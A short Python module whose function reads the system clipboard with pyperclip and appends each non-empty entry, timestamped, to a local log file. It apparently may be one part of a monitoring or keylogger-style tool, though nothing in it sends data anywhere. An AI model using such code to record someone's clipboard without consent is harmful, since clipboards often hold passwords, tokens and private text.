import pyperclip
from datetime import datetime

# Define the path to the log file where clipboard data will be saved
LOG_FILE = "logs/clipboard.txt"

def capture():
     
   # Captures the current clipboard content and appends it to a log file with a timestamp.
    
    try:
        clipboard_data = pyperclip.paste()
        if clipboard_data:
            with open(LOG_FILE, "a") as f:
                 # Get the current time formatted as a readable string
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"{timestamp}: {clipboard_data} \n")
    except Exception as e:
        print(f"[ERROR] Clipboard capture failed: {e}")